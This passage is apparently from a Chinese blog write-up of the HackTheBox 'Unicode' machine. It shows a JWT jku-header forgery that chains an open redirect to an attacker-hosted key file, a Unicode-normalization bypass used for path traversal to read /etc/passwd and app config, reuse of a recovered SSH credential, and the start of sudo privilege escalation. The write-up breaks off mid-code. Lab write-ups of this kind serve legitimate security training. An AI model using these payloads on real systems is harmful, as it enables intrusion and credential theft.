class="hljs-number">6</span>f:<span class="hljs-number">39</span>:<span class="hljs-number">89</span>:<span class="hljs-number">36</span>:<span class="hljs-number">10</span>:<span class="hljs-number">41</span>:df:<span class="hljs-number">7</span>c (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: <span class="hljs-number">503</span><br>| <span class="hljs-type">http</span>-methods:<br>|<span class="hljs-type">_</span>  Supported Methods: HEAD GET OPTIONS<br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-trane-info: Problem <span class="hljs-built_in">with</span> XML parsing of /evox/about<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><h2 id="站点"><a href="#站点" class="headerlink" title="站点"></a>站点</h2><h3 id="到处看看"><a href="#到处看看" class="headerlink" title="到处看看"></a><strong>到处看看</strong></h3><p>站点看起来是一个威胁情报商业公司的站点，网站最中央有一个非常显眼的按钮。点击按钮会发起重定向访问<code>/redirect/?url=google.com</code>，之后就会经过302跳转转到<code>google.com</code>。</p><p>站点在注册账号和登陆后重定向到<code>/dashboard</code>。首页有三个按钮，看起来中间那个按钮是我们的目标。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519110000548.png" alt="image-20220519110000548"></p><p>同时在界面的底部有一个<code>Powered By flask</code>，大概率这是一个Flask编写的站点。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519105939309.png" alt="image-20220519105939309"></p><p>第一个按钮定位到<code>/pricing</code>，没啥用。第二个按钮定位到<code>/upload</code>，看起来是一个文件上传的绕过。但是Flask并没有文件上传相关的漏洞，同时文件上传的后缀也被限制在了pdf，同时上传成功了并没有读取的界面，看起来这里并不能利用。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519110344446.png" alt="image-20220519110344446"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a><strong>目录扫描</strong></h3><p>目录扫描没有找到有用的结果，这里就不放出来了。</p><h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a><strong>架构分析</strong></h3><p>虽然网站功能本身并没有太多有意思的点，但是抓包能够发现网站使用了jwt作为验证手段。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519111007635.png" alt="image-20220519111007635"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519105356482.png" alt="image-20220519105356482"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ</span>.eyJ1c2VyIjoiYWRtaW4yIn0.E48Ev307FZKerAanbwLSKHXe_c_Y2axUe_K37bCMlTrDpgPGswjiGcMn7ycdAcSQwg1GgIGi23AE1IxvK6iROO2xRmPG71NTLYrXDCkUxZlq-VHFR-<span class="hljs-number">6</span>cCiWddmc-OlRgDK3-RErCFy47AtL4kODl1h9BlKtEXAmftXd3awfFTkfDU1SVqFddhsCn-Dl8ttZILkf4qHXHeD7-<span class="hljs-number">3</span>mk5hjOzHPxi7ez3sei_CRHURQByXj0unjPfJxRJDCNIIZizRAiCpTbG3qyDBbgzjmxJySjMziwrdB0f1vHx-<span class="hljs-number">1</span>cNUVhTBozlzPQx8OsRrcluA9TkXq8jabDQUnItQe91lOb4ufgS1g<br></code></pre></td></tr></table></figure><p>放到<code>jwt.io</code>里解析一下，发现和经常碰到的jwt加密方式不一样，比较常见的jwt header中，alg字段是<code>HS256</code>，这里是<code>RS256</code>，然后有一个不太熟悉的字段<code>jku</code>。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220516134433155.png" alt="image-20220516134433155"></p><h3 id="JKU利用"><a href="#JKU利用" class="headerlink" title="JKU利用"></a>JKU利用</h3><p>访问文件<a href="http://hackmedia.htb/static/jwks.json%EF%BC%8C%E8%83%BD%E5%A4%9F%E5%8F%91%E7%8E%B0%E4%B8%80%E4%BA%9Bemm...%EF%BC%8C%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://hackmedia.htb/static/jwks.json，能够发现一些emm...，看不懂的信息。</a></p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;keys&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;kty&quot;</span>: <span class="hljs-string">&quot;RSA&quot;</span>,<br>            <span class="hljs-string">&quot;use&quot;</span>: <span class="hljs-string">&quot;sig&quot;</span>,<br>            <span class="hljs-string">&quot;kid&quot;</span>: <span class="hljs-string">&quot;hackthebox&quot;</span>,<br>            <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;RS256&quot;</span>,<br>            <span class="hljs-string">&quot;n&quot;</span>: <span class="hljs-string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span>,<br>            <span class="hljs-string">&quot;e&quot;</span>: <span class="hljs-string">&quot;AQAB&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以尝试搜索一下jwks.json这个文件名，总之最后找到下面两个有用的帖子。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>nfosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb<br>https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">236830</span><br></code></pre></td></tr></table></figure><p>在安全客那篇帖子中对可用的攻击方式做了很好的总结。我们先尝试一下随便修改<code>jku</code>指向我们的服务器地址，如<code>&quot;jku&quot;:&quot;http://10.10.16.4/jwks.json&quot;</code>，发现返回报错。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220516135451161.png" alt="image-20220516135451161"></p><p>但是同时我们的机子上并没有显示服务器的访问信息。可以断定是程序逻辑本身对<code>jku</code>作了前缀限制。按照帖子中提到的方法，我们可以使用重定位的方式绕过限制，原因是在之前我们发现了一个重定位的链接<code>/redirect</code>。</p><p>直接使用 <a href="http://hackmedia.htb/redirect/?url=10.10.16.2/jwks.json%E4%B8%8D%E8%A1%8C%E3%80%82">http://hackmedia.htb/redirect/?url=10.10.16.2/jwks.json不行。</a></p><p>进一步尝试发现<a href="http://hackmedia.htb/redirect/?url=10.10.16.2/jwks.json">http://hackmedia.htb/static/../redirect/?url=10.10.16.2/jwks.json</a> 可以。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">➤  echo &#x27;&#123;<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>,<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;RS256&quot;</span>,<span class="hljs-string">&quot;jku&quot;</span>:<span class="hljs-string">&quot;http://hackmedia.htb/static/../redirect/?url=10.10.16.4/jwks.json&quot;</span>&#125;&#x27; | <span class="hljs-type">base64</span> -w0<br>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8/dXJsPTEwLjEwLjE2LjQvandrcy5qc29uIn0<br></code></pre></td></tr></table></figure><p>替换Cookie后刷新，能够在本机上看到服务器的访问记录。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➤  python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.11.126</span> - - <span class="hljs-string">[16/May/2022 14:03:02]</span> code <span class="hljs-number">404</span>, message File not found<br><span class="hljs-number">10.10.11.126</span> - - <span class="hljs-string">[16/May/2022 14:03:02]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /jwks.json HTTP/1.1&quot;</span> <span class="hljs-number">404</span> -<br></code></pre></td></tr></table></figure><p>为了能够达到伪造token，首先需要伪造auth cookie。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -out keypair.pem 2048<span class="hljs-comment">#产生私钥</span><br>openssl rsa -<span class="hljs-keyword">in</span> keypair.pem -pubout -out public.crt<span class="hljs-comment">#产生公钥</span><br></code></pre></td></tr></table></figure><p>之后将公私钥文件内容分别贴入签名部分。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519120453346.png" alt="image-20220519120453346"></p><p>于我而言，得到了如下Cookie。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJSUzI<span class="hljs-number">1</span>NiIsImprdSI<span class="hljs-number">6</span>Imh<span class="hljs-number">0</span>dHA<span class="hljs-number">6</span>Ly<span class="hljs-number">9</span>oYWNrbWVkaWEuaHRiL<span class="hljs-number">3</span>N<span class="hljs-number">0</span>YXRpYy<span class="hljs-number">8</span>uLi<span class="hljs-number">9</span>yZWRpcmVjdC<span class="hljs-number">8</span>_dXJsPTEwLjEwLjE<span class="hljs-number">2</span>LjQvandrcy<span class="hljs-number">5</span>qc<span class="hljs-number">29</span>uIn<span class="hljs-number">0</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VyIjoiYWRtaW<span class="hljs-number">4</span>ifQ.vkKhZyZ<span class="hljs-number">7</span>NTaiJSZSJI<span class="hljs-number">3</span>pT<span class="hljs-number">1</span>pknITQRVgRFKnQ<span class="hljs-number">0</span>RN<span class="hljs-number">4</span>I_owpB<span class="hljs-number">6e25</span>_lFQEekoqO<span class="hljs-number">61</span>uA<span class="hljs-number">0</span>Et<span class="hljs-number">8</span>qGocxYUg<span class="hljs-number">5e79</span>LSx<span class="hljs-number">1</span>Uwa<span class="hljs-number">0</span>B<span class="hljs-number">7</span>uVVNOld<span class="hljs-number">1</span>A<span class="hljs-number">6</span>QiVEC<span class="hljs-number">06</span>XBYkJ<span class="hljs-number">22</span>FE<span class="hljs-number">1</span>Qxe<span class="hljs-number">7</span>xK-xRBMY<span class="hljs-number">2</span>fHXFH<span class="hljs-number">49</span>fTYSS<span class="hljs-number">4</span>V_wQNP_iLD<span class="hljs-number">1</span>xu<span class="hljs-number">7</span>NLxQlN<span class="hljs-number">9</span>hLCCaQiW-iJlP<span class="hljs-number">96</span>j<span class="hljs-number">1</span>axOtE<span class="hljs-number">5</span>zBBPHFGzh<span class="hljs-number">8</span>LU<span class="hljs-number">5</span>G<span class="hljs-number">4</span>TTH_<span class="hljs-number">9</span>lrDQpgg<span class="hljs-number">7</span>jeITO<span class="hljs-number">06</span>ZMvanuGTJ<span class="hljs-number">7</span>ijgyEMinUJOsOs-SGHzcf<span class="hljs-number">6</span>vtOA<span class="hljs-number">8</span>kPd_jbp_Bgf<span class="hljs-number">0</span>JgKkJFNDHE-V<span class="hljs-number">3</span>GoucATG<span class="hljs-number">625</span>NXaOGkRXu<span class="hljs-number">7</span>PM<span class="hljs-number">0</span>KXnZJMzfBLcHZlIR<span class="hljs-number">3</span>o<span class="hljs-number">4</span>G<span class="hljs-number">4</span>pT<span class="hljs-number">5</span>Lw<span class="hljs-number">2</span>jy<span class="hljs-number">72</span>m<span class="hljs-number">3</span>Nw<br></code></pre></td></tr></table></figure><p>接下来就是构造我们的<code>jwks.json</code>了。使用如下脚本生成<code>jwks.json</code>中的n、e值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;publickey.crt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>key = RSA.importKey(fp.read())<br>fp.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;n:&quot;</span>, <span class="hljs-built_in">hex</span>(key.n)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;e:&quot;</span>, <span class="hljs-built_in">hex</span>(key.e)<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">➤  python2 ne.py                                                                                                      <br><span class="hljs-symbol">n:</span> <span class="hljs-number">0xc71e2172aacd5d11239575380d3768f0615f23e049bce26eed5b86a0646ddd919a2999831d7674c0b40900c26e51491c01dfde7c59bbd328a73ffb96e85d55bdf22e60880c3f504060b0c3a231f26df74898d8ca46fae6378b4c00c754fb6134408c23a46ccc58ee8f6a5e3533a38ddee1303e10057433258b4acd72fd9a20c4bfce2c24ed21d4a235b2e1556ba52ee9027bbd279facce009872d1b9e254d10eefe07f20bc6932ef269bdedd32127948316</span><br><span class="hljs-symbol">e:</span> <span class="hljs-number">0x10001</span>L<br></code></pre></td></tr></table></figure><p>但是观察服务器上的<code>jwks.json</code>，我们发现和我们得到的n、e值格式不太一样。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;n&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AQAB&quot;</span><br></code></pre></td></tr></table></figure><p>将<code>AQAB</code>Base64解码，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➤  <span class="hljs-built_in">echo</span> AQAB | <span class="hljs-built_in">base64</span> -d | xxd<br>00000000: 0100 01                                  ...<br></code></pre></td></tr></table></figure><p>合理推测服务器上的n、e是原始十六进制的Base64编码。</p><p>我们也可以据此生成我们的<code>jwks.json</code>文件。e值我们是不用修改了，只用修改n值即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➤  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;c71e2172aacd5d11239575380d3768f0615f23e049bce26eed5b86a0646ddd919a2999831d7674c0b40900c26e51491c01dfde7c59bbd328a73ffb96e85d55bdf22e60880c3f504060b0c3a231f26df74898d8ca46fae6378b4c00c754fb6134408c23a46ccc58ee8f6a5e3533a38ddee1303e10057433258b4acd72fd9a20c4bfce2c24ed21d4a235b2e1556ba52ee9027bbd279facce009872d1b9e254d10eefe07f20bc6932ef269bdedd32127948316&quot;</span> | xxd -r -p | <span class="hljs-built_in">base64</span> -w0<br><br>xx4hcqrNXREjlXU4DTdo8GFfI+BJvOJu7VuGoGRt3ZGaKZmDHXZ0wLQJAMJuUUkcAd/efFm70yinP/uW6F1VvfIuYIgMP1BAYLDDojHybfdImNjKRvrmN4tMAMdU+2E0QIwjpGzMWO6Pal41M6ON3uEwPhAFdDMli0rNcv2aIMS/ziwk7SHUojWy4VVrpS7pAnu9J5+szgCYctG54lTRDu/gfyC8aTLvJpve3TISeUgx<br></code></pre></td></tr></table></figure><p>如此，替换后最后得到我们的<code>jwks.json</code>文件。最后起一个http服务器即可。</p><p>成功后我们就以admin身份进入了（至于为啥是admin，只能说猜的）。</p><h3 id="点题：Unicode"><a href="#点题：Unicode" class="headerlink" title="点题：Unicode"></a>点题：Unicode</h3><p>进入后能够看到admin版的dashboard。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220519121951230.png" alt="image-20220519121951230"></p><p>几个按钮点一遍后发现一个查看pdf报表的链接，猜测有SSRF。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518174401028.png" alt="image-20220518174401028"></p><p>读取一些常见的文件发现一些文件会显示被过滤，比如在这里读取了<code>/etc/passwd</code>。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518174832678.png" alt="image-20220518174832678"></p><p>在读取一些不存在的文件的时候会显示<code>Not Found</code>。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518174932813.png" alt="image-20220518174932813"></p><p>也就是我们需要对这个waf进行一个绕过了，结合题目是Unicode，我们的ByPass机制应该和Unicode有关。</p><p>但首先我们需要知道waf的过滤机制，在一些FUZZ工作后我发现有如下规律：</p><table><thead><tr><th>输入</th><th>结果</th></tr></thead><tbody><tr><td><code>..</code></td><td>通过</td></tr><tr><td><code>./</code></td><td>通过</td></tr><tr><td><code>../</code></td><td>拦截</td></tr><tr><td><code>/et</code></td><td>通过</td></tr><tr><td><code>/etc</code></td><td>拦截</td></tr><tr><td><code>et</code></td><td>通过</td></tr><tr><td><code>etc</code></td><td>拦截</td></tr><tr><td><code>..etc</code></td><td>通过</td></tr><tr><td><code>var</code></td><td>通过</td></tr><tr><td><code>/var</code></td><td>拦截</td></tr><tr><td><code>/abc</code></td><td>通过</td></tr></tbody></table><p>也就是这个waf似乎过滤了一些根目录文件夹名和<code>../</code>这个符号。</p><p>在尝试后我们发现可以通过Unicode兼容性绕过过滤。<a href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">参考</a></p><p>所以我们可以将<code>..</code>替换成<code>‥</code>进行绕过，也可以使用<code>Enclosed alphanumerics</code>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 方案1</span><br>http:<span class="hljs-regexp">//</span>hackmedia.htb<span class="hljs-regexp">/display/</span>?page=‥<span class="hljs-regexp">/‥/</span>‥<span class="hljs-regexp">/‥/</span>etc/passwd<br><br><span class="hljs-comment"># 方案2，理论上可行。但是在这里这个失败了，原因未知。</span><br>http:<span class="hljs-regexp">//</span>hackmedia.htb<span class="hljs-regexp">/display/</span>?page=<span class="hljs-regexp">/ⓔⓣⓒ/</span>ⓟⓐⓢⓢⓦⓓ<br></code></pre></td></tr></table></figure><p>最后使用方案1成功读取了文件。</p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518180737523.png" alt="image-20220518180737523"></p><p>看一眼<code>/proc/self/cmdline</code>，这个熟悉的8000端口和<code>uwsgi</code>，是flask没跑了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518183805959.png" alt="image-20220518183805959"></p><p>然后是<code>/proc/self/environ</code>变量，能够发现一个code用户。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518183901611.png" alt="image-20220518183901611"></p><p>然后尝试读一下源码，典型的flask的主py文件名是<code>app.py</code>，能够成功读取。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518184332934.png" alt="image-20220518184332934"></p><p>然后是数据库配置文件。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518184400336.png" alt="image-20220518184400336"></p><p>得到凭据信息<code>code:B3stC0d3r2021@@!</code>，拿去撞库登录ssh，成功。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518184545949.png" alt="image-20220518184545949"></p><h1 id="0x02-Root"><a href="#0x02-Root" class="headerlink" title="0x02 Root"></a>0x02 Root</h1><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>接下来就是提权了，<code>sudo -l</code> 就能直接看到我们的目标。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">code<span class="hljs-variable">@code</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> code on <span class="hljs-symbol">code:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> code may run the following commands on <span class="hljs-symbol">code:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/treport<br></code></pre></td></tr></table></figure><h2 id="treport-逆向"><a href="#treport-逆向" class="headerlink" title="treport 逆向"></a>treport 逆向</h2><p>运行文件能够看到这是一个处理report的小脚本。从这个文件的功能不难发现可能的提权方式就是文件覆写（包括写SSH，sudoer文件等）。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">code@<span class="hljs-selector-tag">code</span>:~$ sudo /usr/bin/treport<br><span class="hljs-number">1</span><span class="hljs-selector-class">.Create</span> Threat Report.<br><span class="hljs-number">2</span><span class="hljs-selector-class">.Read</span> Threat Report.<br><span class="hljs-number">3</span><span class="hljs-selector-class">.Download</span> A Threat Report.<br><span class="hljs-number">4</span><span class="hljs-selector-class">.Quit</span>.<br>Enter your choice:<br></code></pre></td></tr></table></figure><p>用<code>file</code>命令看看，能够发现这是一个ELF可执行文件。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">code@code:~$ <span class="hljs-keyword">file</span> <span class="hljs-regexp">/usr/</span>bin/treport<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /</span>lib64<span class="hljs-regexp">/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/</span>Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span>, stripped<br></code></pre></td></tr></table></figure><p>另外这个文件大得过分，和它所体现的功能实在不是很对应。这种一般都是使用了某些脚本代码打包工具。</p><p>将文件脱下用IDA看看，能够看到很多<code>Py</code>开头的文件。初步推断就是Python。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Unicode.assets/image-20220518191649135.png" alt="image-20220518191649135"></p><p>然后尝试使用<a href="https://github.com/extremecoders-re/pyinstxtractor">PyInstaller Extractor</a>提取pyc文件，成功。</p><figure class="highlight plaintext"><figcaption><span>python pyinstxtractor.py ../../桌面/Unicode/treport</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ➤">➤  python pyinstxtractor.py ../../桌面/Unicode/treport<br>[+] Processing ../../桌面/Unicode/treport<br>[+] Pyinstaller version: 2.1+<br>[+] Python version: 38<br>[+] Length of package: 6798297 bytes<br>[+] Found 46 files in CArchive<br>[+] Beginning extraction...please standby<br>[+] Possible entry point: pyiboot01_bootstrap.pyc<br>[+] Possible entry point: pyi_rth_pkgutil.pyc<br>[+] Possible entry point: pyi_rth_multiprocessing.pyc<br>[+] Possible entry point: pyi_rth_inspect.pyc<br>[+] Possible entry point: treport.pyc<br>[!] Warning: This script is running in a different Python version than the one used to build the executable.<br>[!] Please run this script in Python38 to prevent extraction errors during unmarshalling<br>[!] Skipping pyz extraction<br>[+] Successfully extracted pyinstaller archive: ../../桌面/Unicode/treport<br><br>You can now use a python decompiler on the pyc files within the extracted directory<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">➤  ll | grep pyc         <br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 1.4K  5月<span class="hljs-number"> 18 </span>19:36 pyiboot01_bootstrap.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 1.8K  5月<span class="hljs-number"> 18 </span>19:36 pyimod01_os_path.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 8.7K  5月<span class="hljs-number"> 18 </span>19:36 pyimod02_archive.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali  13K  5月<span class="hljs-number"> 18 </span>19:36 pyimod03_importers.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 3.4K  5月<span class="hljs-number"> 18 </span>19:36 pyimod04_ctypes.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali <span class="hljs-number"> 688 </span> 5月<span class="hljs-number"> 18 </span>19:36 pyi_rth_inspect.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 2.1K  5月<span class="hljs-number"> 18 </span>19:36 pyi_rth_multiprocessing.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 1.1K  5月<span class="hljs-number"> 18 </span>19:36 pyi_rth_pkgutil.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali <span class="hljs-number"> 311 </span> 5月<span class="hljs-number"> 18 </span>19:36 struct.pyc<br>-rw-r--r--<span class="hljs-number"> 1 </span>kali kali 2.6K  5月<span class="hljs-number"> 18 </span>19:36 treport.pyc<br></code></pre></td></tr></table></figure><p>然后使用 <a href="https://pypi.org/project/uncompyle6/">uncompyle6</a> 将pyc文件还原成py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 